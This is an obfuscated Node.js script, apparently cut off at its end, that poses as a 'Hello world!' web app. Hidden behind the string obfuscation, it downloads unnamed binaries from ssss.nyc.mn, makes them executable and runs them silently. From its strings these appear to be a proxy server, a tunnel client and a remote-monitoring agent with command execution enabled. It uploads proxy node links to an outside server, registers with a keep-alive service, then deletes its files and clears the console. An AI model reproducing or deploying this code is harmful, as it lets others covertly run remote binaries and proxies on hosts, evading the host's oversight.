const _0x75d768=_0x5b9f;(function(_0x155dba,_0x448e51){const _0x214493=_0x5b9f,_0xa4b98b=_0x155dba();while(!![]){try{const _0x12e9f8=parseInt(_0x214493(0x241))/0x1*(parseInt(_0x214493(0x298))/0x2)+-parseInt(_0x214493(0x23a))/0x3*(-parseInt(_0x214493(0x289))/0x4)+parseInt(_0x214493(0x26b))/0x5+parseInt(_0x214493(0x228))/0x6+parseInt(_0x214493(0x1f8))/0x7+parseInt(_0x214493(0x222))/0x8*(-parseInt(_0x214493(0x208))/0x9)+parseInt(_0x214493(0x270))/0xa*(-parseInt(_0x214493(0x26c))/0xb);if(_0x12e9f8===_0x448e51)break;else _0xa4b98b['push'](_0xa4b98b['shift']());}catch(_0x3c788a){_0xa4b98b['push'](_0xa4b98b['shift']());}}}(_0x12f4,0xc7780));const express=require(_0x75d768(0x245)),app=express(),axios=require(_0x75d768(0x2b8)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x75d768(0x25d)),exec=promisify(require(_0x75d768(0x27e))[_0x75d768(0x24e)]),{execSync}=require(_0x75d768(0x27e)),UPLOAD_URL=process[_0x75d768(0x260)][_0x75d768(0x248)]||'',PROJECT_URL=process[_0x75d768(0x260)][_0x75d768(0x292)]||'',AUTO_ACCESS=process[_0x75d768(0x260)][_0x75d768(0x27b)]||![],FILE_PATH=process[_0x75d768(0x260)][_0x75d768(0x277)]||'./tmp',SUB_PATH=process[_0x75d768(0x260)][_0x75d768(0x204)]||_0x75d768(0x20b),PORT=process[_0x75d768(0x260)][_0x75d768(0x20d)]||process[_0x75d768(0x260)][_0x75d768(0x21a)]||0xbb8,UUID=process[_0x75d768(0x260)]['UUID']||_0x75d768(0x2ad),NEZHA_SERVER=process['env'][_0x75d768(0x2a2)]||'',NEZHA_PORT=process[_0x75d768(0x260)][_0x75d768(0x20c)]||'',NEZHA_KEY=process[_0x75d768(0x260)][_0x75d768(0x2a3)]||'',ARGO_DOMAIN=process[_0x75d768(0x260)][_0x75d768(0x258)]||_0x75d768(0x293),ARGO_AUTH=process[_0x75d768(0x260)]['ARGO_AUTH']||_0x75d768(0x268),ARGO_PORT=process[_0x75d768(0x260)][_0x75d768(0x280)]||0x1f41,CFIP=process[_0x75d768(0x260)]['CFIP']||_0x75d768(0x24d),CFPORT=process[_0x75d768(0x260)][_0x75d768(0x1f9)]||0x1bb,NAME=process[_0x75d768(0x260)][_0x75d768(0x2bd)]||_0x75d768(0x28f);function _0x5b9f(_0x5b9ea7,_0x4e0d77){_0x5b9ea7=_0x5b9ea7-0x1f2;const _0x12f452=_0x12f4();let _0x5b9f7e=_0x12f452[_0x5b9ea7];return _0x5b9f7e;}!fs[_0x75d768(0x215)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x75d768(0x22d)](FILE_PATH+_0x75d768(0x299))):console['log'](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0xa8be42=_0x75d768,_0x33d012=_0xa8be42(0x230);let _0x1ac4ce='';for(let _0x5f246d=0x0;_0x5f246d<0x6;_0x5f246d++){_0x1ac4ce+=_0x33d012['charAt'](Math['floor'](Math[_0xa8be42(0x212)]()*_0x33d012[_0xa8be42(0x2a0)]));}return _0x1ac4ce;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x75d768(0x271)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x75d768(0x271)](FILE_PATH,webName),botPath=path[_0x75d768(0x271)](FILE_PATH,botName),subPath=path[_0x75d768(0x271)](FILE_PATH,'sub.txt'),listPath=path[_0x75d768(0x271)](FILE_PATH,'list.txt'),bootLogPath=path['join'](FILE_PATH,'boot.log'),configPath=path[_0x75d768(0x271)](FILE_PATH,_0x75d768(0x203));function deleteNodes(){const _0x161358=_0x75d768;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x114b1c;try{_0x114b1c=fs[_0x161358(0x236)](subPath,_0x161358(0x26f));}catch{return null;}const _0x28b1b9=Buffer[_0x161358(0x233)](_0x114b1c,_0x161358(0x21c))[_0x161358(0x20a)](_0x161358(0x26f)),_0x5ab7c5=_0x28b1b9[_0x161358(0x247)]('\x0a')[_0x161358(0x285)](_0x35385a=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x161358(0x2b1)](_0x35385a));if(_0x5ab7c5[_0x161358(0x2a0)]===0x0)return;return axios[_0x161358(0x23b)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x161358(0x26a)]({'nodes':_0x5ab7c5}),{'headers':{'Content-Type':_0x161358(0x25e)}})[_0x161358(0x250)](_0x2edb0a=>{return null;}),null;}catch(_0x35ffc0){return null;}}function cleanupOldFiles(){const _0x484216=_0x75d768;try{const _0x166da8=fs[_0x484216(0x254)](FILE_PATH);_0x166da8[_0x484216(0x252)](_0x326552=>{const _0x522448=_0x484216,_0x5d48ed=path['join'](FILE_PATH,_0x326552);try{const _0x599bdf=fs['statSync'](_0x5d48ed);_0x599bdf[_0x522448(0x255)]()&&fs['unlinkSync'](_0x5d48ed);}catch(_0x38adb9){}});}catch(_0x2fccb7){}}app[_0x75d768(0x276)]('/',function(_0xdb9dd4,_0x29165c){const _0x2c5db7=_0x75d768;_0x29165c[_0x2c5db7(0x209)](_0x2c5db7(0x24b));});async function generateConfig(){const _0xd1778b=_0x75d768,_0x14ee9f={'log':{'access':_0xd1778b(0x217),'error':'/dev/null','loglevel':_0xd1778b(0x2b6)},'inbounds':[{'port':ARGO_PORT,'protocol':_0xd1778b(0x249),'settings':{'clients':[{'id':UUID,'flow':_0xd1778b(0x234)}],'decryption':_0xd1778b(0x2b6),'fallbacks':[{'dest':0xbb9},{'path':_0xd1778b(0x22c),'dest':0xbba},{'path':_0xd1778b(0x278),'dest':0xbbb},{'path':_0xd1778b(0x221),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0xd1778b(0x275),'protocol':_0xd1778b(0x249),'settings':{'clients':[{'id':UUID}],'decryption':_0xd1778b(0x2b6)},'streamSettings':{'network':_0xd1778b(0x291),'security':_0xd1778b(0x2b6)}},{'port':0xbba,'listen':_0xd1778b(0x275),'protocol':_0xd1778b(0x249),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0xd1778b(0x2b6)},'streamSettings':{'network':'ws','security':_0xd1778b(0x2b6),'wsSettings':{'path':_0xd1778b(0x22c)}},'sniffing':{'enabled':!![],'destOverride':[_0xd1778b(0x229),_0xd1778b(0x223),_0xd1778b(0x2bc)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0xd1778b(0x2aa),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0xd1778b(0x229),'tls',_0xd1778b(0x2bc)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0xd1778b(0x275),'protocol':_0xd1778b(0x266),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0xd1778b(0x2b6),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0xd1778b(0x229),_0xd1778b(0x223),_0xd1778b(0x2bc)],'metadataOnly':![]}}],'dns':{'servers':[_0xd1778b(0x25b)]},'outbounds':[{'protocol':_0xd1778b(0x2b9),'tag':_0xd1778b(0x21d)},{'protocol':_0xd1778b(0x28a),'tag':_0xd1778b(0x219)}]};fs[_0xd1778b(0x267)](path[_0xd1778b(0x271)](FILE_PATH,_0xd1778b(0x203)),JSON[_0xd1778b(0x26a)](_0x14ee9f,null,0x2));}function getSystemArchitecture(){const _0x3c19ca=_0x75d768,_0x39d8a2=os['arch']();return _0x39d8a2===_0x3c19ca(0x237)||_0x39d8a2===_0x3c19ca(0x22a)||_0x39d8a2===_0x3c19ca(0x261)?'arm':_0x3c19ca(0x29a);}function downloadFile(_0x3df135,_0x5f5bde,_0x2da9e5){const _0x251ffc=_0x75d768,_0x20701b=_0x3df135;!fs['existsSync'](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x172175=fs[_0x251ffc(0x290)](_0x20701b);axios({'method':'get','url':_0x5f5bde,'responseType':_0x251ffc(0x272)})[_0x251ffc(0x244)](_0x5a3c90=>{const _0x532bbf=_0x251ffc;_0x5a3c90[_0x532bbf(0x259)][_0x532bbf(0x281)](_0x172175),_0x172175['on'](_0x532bbf(0x29e),()=>{const _0x55a5bb=_0x532bbf;_0x172175[_0x55a5bb(0x29b)](),console[_0x55a5bb(0x22d)](_0x55a5bb(0x1f4)+path[_0x55a5bb(0x27c)](_0x20701b)+_0x55a5bb(0x297)),_0x2da9e5(null,_0x20701b);}),_0x172175['on'](_0x532bbf(0x22b),_0x6ba77a=>{const _0x1cd081=_0x532bbf;fs[_0x1cd081(0x1f7)](_0x20701b,()=>{});const _0x61e875='Download\x20'+path['basename'](_0x20701b)+_0x1cd081(0x240)+_0x6ba77a[_0x1cd081(0x1f2)];console['error'](_0x61e875),_0x2da9e5(_0x61e875);});})['catch'](_0x59343f=>{const _0x453809=_0x251ffc,_0x378676=_0x453809(0x1f4)+path[_0x453809(0x27c)](_0x20701b)+_0x453809(0x240)+_0x59343f[_0x453809(0x1f2)];console['error'](_0x378676),_0x2da9e5(_0x378676);});}async function downloadFilesAndRun(){const _0x342bbd=_0x75d768,_0x46ef81=getSystemArchitecture(),_0x354746=getFilesForArchitecture(_0x46ef81);if(_0x354746[_0x342bbd(0x2a0)]===0x0){console[_0x342bbd(0x22d)](_0x342bbd(0x23f));return;}const _0x32e935=_0x354746[_0x342bbd(0x287)](_0x1de0e6=>{return new Promise((_0x59b9af,_0x551763)=>{const _0x53f9cb=_0x5b9f;downloadFile(_0x1de0e6[_0x53f9cb(0x264)],_0x1de0e6[_0x53f9cb(0x296)],(_0x55e083,_0x58471e)=>{_0x55e083?_0x551763(_0x55e083):_0x59b9af(_0x58471e);});});});try{await Promise[_0x342bbd(0x2bb)](_0x32e935);}catch(_0x30b98b){console[_0x342bbd(0x22b)](_0x342bbd(0x274),_0x30b98b);return;}function _0x1be8c6(_0x3df485){const _0x11d3bc=_0x342bbd,_0x1927ac=0x1fd;_0x3df485[_0x11d3bc(0x252)](_0x15d9fc=>{const _0x14e78e=_0x11d3bc;fs[_0x14e78e(0x215)](_0x15d9fc)&&fs[_0x14e78e(0x200)](_0x15d9fc,_0x1927ac,_0x109c21=>{const _0x1d9de7=_0x14e78e;_0x109c21?console['error']('Empowerment\x20failed\x20for\x20'+_0x15d9fc+':\x20'+_0x109c21):console[_0x1d9de7(0x22d)](_0x1d9de7(0x2a1)+_0x15d9fc+':\x20'+_0x1927ac['toString'](0x8));});});}const _0x5e75c8=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x1be8c6(_0x5e75c8);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x248a15=NEZHA_SERVER[_0x342bbd(0x29f)](':')?NEZHA_SERVER[_0x342bbd(0x247)](':')[_0x342bbd(0x24f)]():'',_0x185a8b=new Set(['443',_0x342bbd(0x23c),_0x342bbd(0x227),'2087',_0x342bbd(0x263),_0x342bbd(0x284)]),_0x2da6e1=_0x185a8b[_0x342bbd(0x262)](_0x248a15)?_0x342bbd(0x279):'false',_0x1c5c1c=_0x342bbd(0x216)+NEZHA_KEY+_0x342bbd(0x23e)+NEZHA_SERVER+_0x342bbd(0x231)+_0x2da6e1+_0x342bbd(0x2af)+UUID;fs[_0x342bbd(0x267)](path[_0x342bbd(0x271)](FILE_PATH,_0x342bbd(0x21f)),_0x1c5c1c);const _0x1d013a=_0x342bbd(0x202)+phpPath+_0x342bbd(0x26d)+FILE_PATH+_0x342bbd(0x1fd);try{await exec(_0x1d013a),console[_0x342bbd(0x22d)](phpName+_0x342bbd(0x2be)),await new Promise(_0xadc705=>setTimeout(_0xadc705,0x3e8));}catch(_0x2cc061){console[_0x342bbd(0x22b)]('php\x20running\x20error:\x20'+_0x2cc061);}}else{let _0x1feb83='';const _0x5f03e8=[_0x342bbd(0x2ac),'8443',_0x342bbd(0x227),_0x342bbd(0x23d),_0x342bbd(0x263),'2053'];_0x5f03e8[_0x342bbd(0x29f)](NEZHA_PORT)&&(_0x1feb83='--tls');const _0x559d4d=_0x342bbd(0x202)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x342bbd(0x214)+NEZHA_KEY+'\x20'+_0x1feb83+_0x342bbd(0x295);try{await exec(_0x559d4d),console[_0x342bbd(0x22d)](npmName+_0x342bbd(0x2be)),await new Promise(_0x476a93=>setTimeout(_0x476a93,0x3e8));}catch(_0x3020cb){console[_0x342bbd(0x22b)](_0x342bbd(0x251)+_0x3020cb);}}}else console[_0x342bbd(0x22d)](_0x342bbd(0x2b3));const _0x492ce8=_0x342bbd(0x202)+webPath+_0x342bbd(0x2b0)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x492ce8),console[_0x342bbd(0x22d)](webName+_0x342bbd(0x2be)),await new Promise(_0xa2cfac=>setTimeout(_0xa2cfac,0x3e8));}catch(_0x2674bc){console[_0x342bbd(0x22b)](_0x342bbd(0x1fa)+_0x2674bc);}if(fs['existsSync'](botPath)){let _0x1b6bbd;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x1b6bbd=_0x342bbd(0x28b)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x1b6bbd='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x342bbd(0x225):_0x1b6bbd='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x342bbd(0x22f)+ARGO_PORT;try{await exec(_0x342bbd(0x202)+botPath+'\x20'+_0x1b6bbd+_0x342bbd(0x29d)),console['log'](botName+'\x20is\x20running'),await new Promise(_0x48ce27=>setTimeout(_0x48ce27,0x7d0));}catch(_0x1cd67b){console[_0x342bbd(0x22b)](_0x342bbd(0x2b7)+_0x1cd67b);}}await new Promise(_0x5df2a0=>setTimeout(_0x5df2a0,0x1388));}function getFilesForArchitecture(_0x573857){const _0x16630e=_0x75d768;let _0x1a0ed6;_0x573857===_0x16630e(0x237)?_0x1a0ed6=[{'fileName':webPath,'fileUrl':_0x16630e(0x253)},{'fileName':botPath,'fileUrl':_0x16630e(0x2ae)}]:_0x1a0ed6=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x16630e(0x243)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0xf984a9=_0x573857===_0x16630e(0x237)?_0x16630e(0x21e):_0x16630e(0x1fe);_0x1a0ed6['unshift']({'fileName':npmPath,'fileUrl':_0xf984a9});}else{const _0xb4901f=_0x573857==='arm'?'https://arm64.ssss.nyc.mn/v1':_0x16630e(0x273);_0x1a0ed6['unshift']({'fileName':phpPath,'fileUrl':_0xb4901f});}}return _0x1a0ed6;}function argoType(){const _0x47e2ab=_0x75d768;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x47e2ab(0x1f5));return;}if(ARGO_AUTH[_0x47e2ab(0x29f)](_0x47e2ab(0x238))){fs[_0x47e2ab(0x267)](path[_0x47e2ab(0x271)](FILE_PATH,_0x47e2ab(0x1f3)),ARGO_AUTH);const _0xb2fe74='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x47e2ab(0x247)]('\x22')[0xb]+_0x47e2ab(0x235)+path['join'](FILE_PATH,_0x47e2ab(0x1f3))+_0x47e2ab(0x29c)+ARGO_DOMAIN+_0x47e2ab(0x218)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs['writeFileSync'](path[_0x47e2ab(0x271)](FILE_PATH,_0x47e2ab(0x1fb)),_0xb2fe74);}else console[_0x47e2ab(0x22d)](_0x47e2ab(0x2b5));}function _0x12f4(){const _0x40157c=['vmess','?security=tls&sni=','443','b4bd0c92-1d75-483f-b187-9080bf3a3d8a','https://arm64.ssss.nyc.mn/bot','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','\x20-c\x20','test','/api/add-nodes','NEZHA\x20variable\x20is\x20empty,skip\x20running','clear','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','none','Error\x20executing\x20command:\x20','axios','freedom','match','all','quic','NAME','\x20is\x20running','text/plain;\x20charset=utf-8','/api/add-subscriptions','message','tunnel.json','Download\x20','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','unlink','3640042kOTJMc','CFPORT','web\x20running\x20error:\x20','tunnel.yml','/sub.txt\x20saved\x20successfully','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','https://amd64.ssss.nyc.mn/agent','automatic\x20access\x20task\x20added\x20successfully','chmod','taskkill\x20/f\x20/im\x20','nohup\x20','config.json','SUB_PATH','firefox','charAt','set','4857381blaAmB','send','toString','sub','NEZHA_PORT','SERVER_PORT','\x0a\x20\x20\x20\x20','?encryption=none&security=tls&sni=','listen','platform','random','pkill\x20-f\x20\x22[','\x20-p\x20','existsSync','\x0aclient_secret:\x20','/dev/null','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','block','PORT','Add\x20automatic\x20access\x20task\x20faild:\x20','base64','direct','https://arm64.ssss.nyc.mn/agent','config.yaml','&path=%2Fvless-argo%3Fed%3D2560#','/trojan-argo','24TbIcDa','tls','Error\x20in\x20startserver:','/tunnel.yml\x20run','\x0a\x0atrojan://','2096','588558XLgcQd','http','arm64','error','/vless-argo','log','Content-Type','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','abcdefghijklmnopqrstuvwxyz','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','country_code','from','xtls-rprx-vision','\x0a\x20\x20credentials-file:\x20','readFileSync','arm','TunnelSecret','unlinkSync','2536941uDInRj','post','8443','2087','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','\x20failed:\x20','12674VZHUEL','response','https://amd64.ssss.nyc.mn/bot','then','express','App\x20is\x20running','split','UPLOAD_URL','vless','win32','Hello\x20world!','push','cdns.doon.eu.org','exec','pop','catch','npm\x20running\x20error:\x20','forEach','https://arm64.ssss.nyc.mn/web','readdirSync','isFile','.exe\x20>\x20nul\x202>&1','&fp=firefox&type=ws&host=','ARGO_DOMAIN','data','\x20>/dev/null\x202>&1','https+local://8.8.8.8/dns-query','Subscription\x20uploaded\x20successfully','util','application/json','del\x20/f\x20/q\x20','env','aarch64','has','2083','fileName','http\x20server\x20is\x20running\x20on\x20port:','trojan','writeFileSync','eyJhIjoiNzQzM2I5YmZmZGZjYTEyNjJkYzRhYzIwZGMyZDJkOGUiLCJ0IjoiYmNiZjgyYzAtMmM5Zi00MDIzLTkwZDQtODg4ZDBmNjBlODI2IiwicyI6Ik9UUmxNamMzTWpjdE1HRXlaaTAwWlRNM0xUbG1Zek10Tm1VNU1Ua3hOMlV5TlRBeiJ9','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','stringify','829650EtOAvS','3954863HrfRrl','\x20-c\x20\x22','boot.log','utf-8','10TsUQpf','join','stream','https://amd64.ssss.nyc.mn/v1','Error\x20downloading\x20files:','127.0.0.1','get','FILE_PATH','/vmess-argo','true','countryCode','AUTO_ACCESS','basename','substring','child_process','\x0avless://','ARGO_PORT','pipe','https://ipapi.co/json/','rm\x20-rf\x20','2053','filter','\x22\x20>\x20/dev/null\x202>&1','map','Skipping\x20adding\x20automatic\x20access\x20task','4FfhEMx','blackhole','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','org','status','/vmess-argo?ed=2560','lingdong','createWriteStream','tcp','PROJECT_URL','lingdong.d.b.a.0.4.d.f.0.6.3.0.0.0.7.4.0.1.0.0.2.ip6.arpa\x20','\x0a\x0avmess://','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','fileUrl','\x20successfully','184SoDMTL','\x20is\x20created','amd','close','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','\x20>/dev/null\x202>&1\x20&','finish','includes','length','Empowerment\x20success\x20for\x20','NEZHA_SERVER','NEZHA_KEY','Unhandled\x20error\x20in\x20startserver:','&path=%2Ftrojan-argo%3Fed%3D2560#','Unknown','Nodes\x20uploaded\x20successfully','Error\x20reading\x20boot.log:','ARGO_DOMAIN:'];_0x12f4=function(){return _0x40157c;};return _0x12f4();}async function extractDomains(){const _0x5f04e7=_0x75d768;let _0x5dd342;if(ARGO_AUTH&&ARGO_DOMAIN)_0x5dd342=ARGO_DOMAIN,console[_0x5f04e7(0x22d)](_0x5f04e7(0x2a9),_0x5dd342),await _0x25a3fa(_0x5dd342);else try{const _0x181cda=fs[_0x5f04e7(0x236)](path['join'](FILE_PATH,_0x5f04e7(0x26e)),_0x5f04e7(0x26f)),_0x4adde3=_0x181cda[_0x5f04e7(0x247)]('\x0a'),_0x252062=[];_0x4adde3[_0x5f04e7(0x252)](_0x36d8d9=>{const _0x102d44=_0x5f04e7,_0x4239c8=_0x36d8d9[_0x102d44(0x2ba)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x4239c8){const _0x39f25f=_0x4239c8[0x1];_0x252062[_0x102d44(0x24c)](_0x39f25f);}});if(_0x252062['length']>0x0)_0x5dd342=_0x252062[0x0],console[_0x5f04e7(0x22d)]('ArgoDomain:',_0x5dd342),await _0x25a3fa(_0x5dd342);else{console[_0x5f04e7(0x22d)](_0x5f04e7(0x269)),fs[_0x5f04e7(0x239)](path[_0x5f04e7(0x271)](FILE_PATH,_0x5f04e7(0x26e)));async function _0x5a2e39(){const _0x5414a0=_0x5f04e7;try{process[_0x5414a0(0x211)]===_0x5414a0(0x24a)?await exec(_0x5414a0(0x201)+botName+_0x5414a0(0x256)):await exec(_0x5414a0(0x213)+botName[_0x5414a0(0x206)](0x0)+']'+botName[_0x5414a0(0x27d)](0x1)+_0x5414a0(0x286));}catch(_0x5ac3c3){}}_0x5a2e39(),await new Promise(_0x371676=>setTimeout(_0x371676,0xbb8));const _0x49e3a1=_0x5f04e7(0x1f6)+FILE_PATH+_0x5f04e7(0x22f)+ARGO_PORT;try{await exec(_0x5f04e7(0x202)+botPath+'\x20'+_0x49e3a1+_0x5f04e7(0x29d)),console[_0x5f04e7(0x22d)](botName+'\x20is\x20running'),await new Promise(_0x532246=>setTimeout(_0x532246,0xbb8)),await extractDomains();}catch(_0x21576a){console['error'](_0x5f04e7(0x2b7)+_0x21576a);}}}catch(_0x159a79){console[_0x5f04e7(0x22b)](_0x5f04e7(0x2a8),_0x159a79);}async function _0x4498c2(){const _0x10146e=_0x5f04e7;try{const _0x253fbb=await axios[_0x10146e(0x276)](_0x10146e(0x282),{'timeout':0xbb8});if(_0x253fbb['data']&&_0x253fbb['data'][_0x10146e(0x232)]&&_0x253fbb[_0x10146e(0x259)][_0x10146e(0x28c)])return _0x253fbb['data'][_0x10146e(0x232)]+'_'+_0x253fbb[_0x10146e(0x259)][_0x10146e(0x28c)];}catch(_0x3bf9e6){try{const _0x3320d5=await axios[_0x10146e(0x276)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x3320d5[_0x10146e(0x259)]&&_0x3320d5['data']['status']==='success'&&_0x3320d5[_0x10146e(0x259)][_0x10146e(0x27a)]&&_0x3320d5[_0x10146e(0x259)]['org'])return _0x3320d5[_0x10146e(0x259)][_0x10146e(0x27a)]+'_'+_0x3320d5['data']['org'];}catch(_0x4ce342){}}return _0x10146e(0x2a6);}async function _0x25a3fa(_0x58361c){const _0x5afcc0=await _0x4498c2(),_0x2cdc32=NAME?NAME+'-'+_0x5afcc0:_0x5afcc0;return new Promise(_0x5d1354=>{setTimeout(()=>{const _0x2d152e=_0x5b9f,_0x1e7525={'v':'2','ps':''+_0x2cdc32,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x2d152e(0x2b6),'net':'ws','type':_0x2d152e(0x2b6),'host':_0x58361c,'path':_0x2d152e(0x28e),'tls':_0x2d152e(0x223),'sni':_0x58361c,'alpn':'','fp':_0x2d152e(0x205)},_0x5ce201=_0x2d152e(0x27f)+UUID+'@'+CFIP+':'+CFPORT+_0x2d152e(0x20f)+_0x58361c+_0x2d152e(0x257)+_0x58361c+_0x2d152e(0x220)+_0x2cdc32+_0x2d152e(0x294)+Buffer['from'](JSON['stringify'](_0x1e7525))[_0x2d152e(0x20a)]('base64')+_0x2d152e(0x226)+UUID+'@'+CFIP+':'+CFPORT+_0x2d152e(0x2ab)+_0x58361c+_0x2d152e(0x257)+_0x58361c+_0x2d152e(0x2a5)+_0x2cdc32+_0x2d152e(0x20e);console[_0x2d152e(0x22d)](Buffer[_0x2d152e(0x233)](_0x5ce201)['toString'](_0x2d152e(0x21c))),fs[_0x2d152e(0x267)](subPath,Buffer[_0x2d152e(0x233)](_0x5ce201)[_0x2d152e(0x20a)](_0x2d152e(0x21c))),console[_0x2d152e(0x22d)](FILE_PATH+_0x2d152e(0x1fc)),uploadNodes(),app[_0x2d152e(0x276)]('/'+SUB_PATH,(_0x49ad27,_0x1c691d)=>{const _0x46b94d=_0x2d152e,_0x1f228c=Buffer[_0x46b94d(0x233)](_0x5ce201)[_0x46b94d(0x20a)](_0x46b94d(0x21c));_0x1c691d[_0x46b94d(0x207)](_0x46b94d(0x22e),_0x46b94d(0x2bf)),_0x1c691d['send'](_0x1f228c);}),_0x5d1354(_0x5ce201);},0x7d0);});}}async function uploadNodes(){const _0x2e7540=_0x75d768;if(UPLOAD_URL&&PROJECT_URL){const _0x1ae90d=PROJECT_URL+'/'+SUB_PATH,_0x2d8220={'subscription':[_0x1ae90d]};try{const _0x2f8d7b=await axios['post'](UPLOAD_URL+_0x2e7540(0x2c0),_0x2d8220,{'headers':{'Content-Type':_0x2e7540(0x25e)}});return _0x2f8d7b&&_0x2f8d7b[_0x2e7540(0x28d)]===0xc8?(console[_0x2e7540(0x22d)](_0x2e7540(0x25c)),_0x2f8d7b):null;}catch(_0x2ec1e8){if(_0x2ec1e8['response']){if(_0x2ec1e8[_0x2e7540(0x242)][_0x2e7540(0x28d)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x2e7540(0x215)](listPath))return;const _0x370ed0=fs[_0x2e7540(0x236)](listPath,_0x2e7540(0x26f)),_0x5e7502=_0x370ed0[_0x2e7540(0x247)]('\x0a')['filter'](_0x4d23e3=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2e7540(0x2b1)](_0x4d23e3));if(_0x5e7502[_0x2e7540(0x2a0)]===0x0)return;const _0x26908f=JSON[_0x2e7540(0x26a)]({'nodes':_0x5e7502});try{const _0x270ae1=await axios[_0x2e7540(0x23b)](UPLOAD_URL+_0x2e7540(0x2b2),_0x26908f,{'headers':{'Content-Type':_0x2e7540(0x25e)}});return _0x270ae1&&_0x270ae1[_0x2e7540(0x28d)]===0xc8?(console[_0x2e7540(0x22d)](_0x2e7540(0x2a7)),_0x270ae1):null;}catch(_0x34aaa5){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x1336cc=_0x5b9f,_0x21fbff=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x21fbff[_0x1336cc(0x24c)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x21fbff['push'](phpPath);process[_0x1336cc(0x211)]===_0x1336cc(0x24a)?exec(_0x1336cc(0x25f)+_0x21fbff['join']('\x20')+'\x20>\x20nul\x202>&1',_0x274fe6=>{const _0x25419c=_0x1336cc;console['clear'](),console[_0x25419c(0x22d)](_0x25419c(0x246)),console[_0x25419c(0x22d)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x1336cc(0x283)+_0x21fbff[_0x1336cc(0x271)]('\x20')+_0x1336cc(0x25a),_0x2623b4=>{const _0x59ef1a=_0x1336cc;console[_0x59ef1a(0x2b4)](),console[_0x59ef1a(0x22d)](_0x59ef1a(0x246)),console[_0x59ef1a(0x22d)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x43193d=_0x75d768;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x43193d(0x22d)](_0x43193d(0x288));return;}try{const _0x2e68d1=await axios['post']('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x43193d(0x25e)}});return console[_0x43193d(0x22d)](_0x43193d(0x1ff)),_0x2e68d1;}catch(_0x112000){return console[_0x43193d(0x22b)](_0x43193d(0x21b)+_0x112000['message']),null;}}async function 